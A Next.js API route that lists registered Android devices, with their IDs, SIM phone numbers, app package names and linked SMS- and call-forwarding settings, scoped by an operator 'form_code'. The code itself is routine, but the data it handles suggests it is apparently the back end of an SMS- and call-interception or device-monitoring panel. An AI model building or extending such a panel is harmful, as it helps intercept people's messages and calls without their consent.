import { NextResponse } from "next/server";
import db from "@/lib/db";
import { getAuthenticatedUser } from "@/lib/auth";

export async function GET(request) {
  const authUser = await getAuthenticatedUser();
  if (!authUser)
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { searchParams } = new URL(request.url);
  const page = parseInt(searchParams.get("page")) || 1;
  const limit = parseInt(searchParams.get("limit")) || 10;
  const offset = (page - 1) * limit;
  const search = searchParams.get("search")?.trim() || "";

  try {
    let whereClause = "";
    let params = [];
    let countParams = [];

    // 🔍 If a search query exists, filter by multiple columns
    if (search) {
      whereClause = `
        WHERE (
          d.device_status LIKE ? OR
          d.device_name LIKE ? OR
          d.device_model LIKE ? OR
          d.android_id LIKE ? OR
          d.sim1_phone_no LIKE ? OR
          d.sim2_phone_no LIKE ? OR
          d.package_name LIKE ?
        )
      `;
      const searchValue = `%${search}%`;
      params.push(
        searchValue,
        searchValue,
        searchValue,
        searchValue,
        searchValue,
        searchValue,
        searchValue
      );
      countParams.push(
        searchValue,
        searchValue,
        searchValue,
        searchValue,
        searchValue,
        searchValue,
        searchValue
      );
    }

    // 🧑‍💼 Restrict non-admins to their form_code
    if (authUser.role !== "admin") {
      whereClause += search
        ? " AND d.form_code = ?"
        : " WHERE d.form_code = ?";
      params.push(authUser.form_code);
      countParams.push(authUser.form_code);
    }

    const devicesQuery = `
      SELECT 
        d.*, 
        u.sms_forwarding_to_number_status, 
        u.sms_forwarding_to_number,
        u.call_forwarding_to_number_status
      FROM devices d
      LEFT JOIN users u ON d.form_code = u.form_code
      ${whereClause}
      ORDER BY d.id DESC
      LIMIT ? OFFSET ?
    `;

    params.push(limit, offset);

    const countQuery = `
      SELECT COUNT(*) AS total
      FROM devices d
      LEFT JOIN users u ON d.form_code = u.form_code
      ${whereClause}
    `;

    const [devices] = await db.query(devicesQuery, params);
    const [[{ total }]] = await db.query(countQuery, countParams);

    return NextResponse.json({
      data: devices,
      pagination: {
        total,
        page,
        limit,
        totalPages: Math.ceil(total / limit),
      },
    });
  } catch (error) {
    console.error("Device fetch error:", error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
